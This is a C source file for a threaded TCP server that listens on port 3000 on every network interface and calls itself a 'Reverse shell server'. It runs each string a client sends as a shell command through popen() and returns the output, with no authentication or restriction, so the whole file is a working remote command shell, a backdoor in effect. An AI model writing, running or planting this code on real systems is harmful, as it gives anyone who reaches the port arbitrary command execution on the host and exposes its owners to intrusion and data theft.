#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 3000
#define BUFFER_SIZE 1024

// Thread function to handle an individual client connection.
// The server receives commands from the client, executes them locally,
// and sends the output back to the client. The server supports "exit"
// to close the client session.
void *client_handler(void *arg)
{
    int client_sock = *(int *)arg;
    free(arg);
    char command[BUFFER_SIZE];
    char output[BUFFER_SIZE * 2]; // Buffer to store execution output
    ssize_t num_read;

    while (1)
    {
        memset(command, 0, sizeof(command));
        // Receive command from the client
        num_read = recv(client_sock, command, sizeof(command) - 1, 0);
        if (num_read <= 0)
        {
            perror("recv failed or connection closed");
            break;
        }
        command[num_read] = '\0';

        // If the command is "exit", break out of the loop
        if (strncmp(command, "exit", 4) == 0)
        {
            break;
        }

        // Execute the command using popen() and capture the output
        FILE *fp = popen(command, "r");
        if (fp == NULL)
        {
            snprintf(output, sizeof(output), "Failed to execute command.\n");
        }
        else
        {
            memset(output, 0, sizeof(output));
            size_t total = 0;
            char temp[BUFFER_SIZE];
            while (fgets(temp, sizeof(temp), fp) != NULL)
            {
                size_t len = strlen(temp);
                if (total + len < sizeof(output))
                {
                    strcat(output, temp);
                    total += len;
                }
                else
                {
                    break;
                }
            }
            pclose(fp);
        }

        // Send the command output back to the client
        if (send(client_sock, output, strlen(output), 0) < 0)
        {
            perror("send failed");
            break;
        }
    }

    close(client_sock);
    pthread_exit(NULL);
}

int main()
{
    int server_sock, *client_sock_ptr;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    // Create the socket
    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Prepare the sockaddr_in structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(server_addr.sin_zero), '\0', 8);

    // Bind the socket to the port
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_sock, 5) < 0)
    {
        perror("listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Reverse shell server listening on port %d...\n", PORT);

    // Main loop: accept incoming connections and spawn a thread for each
    while (1)
    {
        int *client_sock = malloc(sizeof(int));
        if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
        {
            perror("accept failed");
            free(client_sock);
            continue;
        }
        printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        pthread_t tid;
        if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
        {
            perror("Failed to create thread");
            close(*client_sock);
            free(client_sock);
            continue;
        }
        // Detach thread so that resources are freed automatically when thread exits
        pthread_detach(tid);
    }

    close(server_sock);
    return 0;
}